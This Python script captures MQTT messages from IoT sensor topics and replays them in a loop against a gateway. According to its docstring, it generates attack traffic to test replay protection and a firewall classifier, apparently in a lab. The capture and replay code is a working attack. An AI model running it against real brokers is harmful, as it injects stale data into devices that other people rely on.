"""
replay_client.py — MQTT replay attack.

Two modes:

  CAPTURE mode  (--mode capture)
    Subscribes to nodes/+/data and saves every message it sees to a JSON
    Lines file (REPLAY_CAPTURE_FILE, default: attack_clients/captured.jsonl).

  REPLAY mode   (--mode replay)  [default]
    Reads the capture file and re-publishes every saved message verbatim,
    looping through them indefinitely.  The seq numbers are NOT updated —
    the gateway's replay-protection check should reject them, but the
    network-layer traffic pattern (same src IP, repeated small bursts,
    low bwd traffic) is what the firewall classifier should flag.

Network signature the firewall should detect:
  - Periodic burst pattern (same payload sizes repeated)
  - Very low Drate (gateway rejects early → sends few ACKs)
  - Low Weight (more fwd than bwd packets)

Environment variables:
  REPLAY_CAPTURE_FILE   Path to .jsonl capture file (default: attack_clients/captured.jsonl)
  REPLAY_TARGET_TOPIC   Override publish topic (default: original topic from capture)
  ATTACK_RATE_HZ        Replay speed in messages/sec (default: 2)
  ATTACK_BURST_COUNT    Stop after N replays (default: 0 = loop forever)
  GATEWAY_IP / GATEWAY_PORT
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
from pathlib import Path

import paho.mqtt.client as mqtt
from dotenv import load_dotenv

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
load_dotenv(dotenv_path=Path(__file__).resolve().parents[1] / ".env")

GATEWAY_IP   = os.getenv("GATEWAY_IP", "127.0.0.1")
GATEWAY_PORT = int(os.getenv("GATEWAY_PORT", "1883"))

REPO_ROOT         = Path(__file__).resolve().parents[1]
DEFAULT_CAPTURE   = Path(__file__).resolve().parent / "captured.jsonl"
CAPTURE_FILE      = Path(os.getenv("REPLAY_CAPTURE_FILE", str(DEFAULT_CAPTURE)))
REPLAY_TOPIC_OVERRIDE = os.getenv("REPLAY_TARGET_TOPIC", "")
RATE_HZ           = float(os.getenv("ATTACK_RATE_HZ", "2"))
BURST_COUNT       = int(os.getenv("ATTACK_BURST_COUNT", "0"))


# ── Capture mode ───────────────────────────────────────────────────────────────

def run_capture() -> None:
    """Subscribe to all node topics and save messages to CAPTURE_FILE."""
    CAPTURE_FILE.parent.mkdir(parents=True, exist_ok=True)
    captured = 0

    def on_connect(client, userdata, flags, rc):
        if rc == 0:
            client.subscribe("nodes/+/data", qos=1)
            print(f"[REPLAY-CAPTURE] Subscribed to nodes/+/data — saving to {CAPTURE_FILE}")
        else:
            print(f"[REPLAY-CAPTURE] Connection failed (rc={rc})", file=sys.stderr)

    def on_message(client, userdata, msg):
        nonlocal captured
        record = {"topic": msg.topic, "payload": msg.payload.decode("utf-8", errors="replace")}
        with open(CAPTURE_FILE, "a") as f:
            f.write(json.dumps(record) + "\n")
        captured += 1
        print(f"[REPLAY-CAPTURE] Saved message #{captured} from {msg.topic}")

    c = mqtt.Client(client_id="replay-capture", clean_session=True)
    c.on_connect = on_connect
    c.on_message = on_message

    try:
        c.connect(GATEWAY_IP, GATEWAY_PORT, keepalive=60)
        c.loop_forever()
    except KeyboardInterrupt:
        print(f"\n[REPLAY-CAPTURE] Stopped. Captured {captured} messages → {CAPTURE_FILE}")
        c.disconnect()


# ── Replay mode ────────────────────────────────────────────────────────────────

def run_replay() -> None:
    """Re-publish captured messages verbatim to stress-test replay protection."""
    if not CAPTURE_FILE.exists():
        print(f"[REPLAY] Capture file not found: {CAPTURE_FILE}", file=sys.stderr)
        print("[REPLAY] Run with --mode capture first to record legitimate traffic.", file=sys.stderr)
        sys.exit(1)

    records: list[dict] = []
    with open(CAPTURE_FILE) as f:
        for line in f:
            line = line.strip()
            if line:
                try:
                    records.append(json.loads(line))
                except json.JSONDecodeError:
                    pass

    if not records:
        print(f"[REPLAY] Capture file is empty: {CAPTURE_FILE}", file=sys.stderr)
        sys.exit(1)

    print(f"[REPLAY] Loaded {len(records)} captured messages from {CAPTURE_FILE}")
    print(f"[REPLAY] Rate: {RATE_HZ:.1f} msg/s  |  Burst: {'unlimited' if BURST_COUNT == 0 else BURST_COUNT}")

    connected = False

    def on_connect(client, userdata, flags, rc):
        nonlocal connected
        connected = rc == 0
        status = "OK" if rc == 0 else f"FAILED rc={rc}"
        print(f"[REPLAY] Connected to {GATEWAY_IP}:{GATEWAY_PORT} — {status}")

    c = mqtt.Client(client_id=f"replay-attacker-{int(time.time())}", clean_session=True)
    c.on_connect = on_connect

    try:
        c.connect(GATEWAY_IP, GATEWAY_PORT, keepalive=60)
    except Exception as exc:
        print(f"[REPLAY] Could not connect: {exc}", file=sys.stderr)
        sys.exit(1)

    c.loop_start()
    # Wait for connection
    for _ in range(20):
        if connected:
            break
        time.sleep(0.1)

    sent = 0
    sleep_s = 1.0 / RATE_HZ if RATE_HZ > 0 else 0

    try:
        while True:
            for rec in records:
                topic   = REPLAY_TOPIC_OVERRIDE or rec["topic"]
                payload = rec["payload"].encode()
                res = c.publish(topic, payload=payload, qos=0)
                if res.rc == mqtt.MQTT_ERR_SUCCESS:
                    sent += 1
                    print(f"[REPLAY] Replayed #{sent} → {topic}")
                if BURST_COUNT > 0 and sent >= BURST_COUNT:
                    raise KeyboardInterrupt
                if sleep_s:
                    time.sleep(sleep_s)

    except KeyboardInterrupt:
        print(f"\n[REPLAY] Stopped after {sent} replayed messages.")
    finally:
        c.loop_stop()
        c.disconnect()


# ── Entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MQTT replay attack client")
    parser.add_argument(
        "--mode", choices=["capture", "replay"], default="replay",
        help="capture: record traffic | replay: re-publish captured messages (default: replay)"
    )
    args = parser.parse_args()

    if args.mode == "capture":
        run_capture()
    else:
        run_replay()
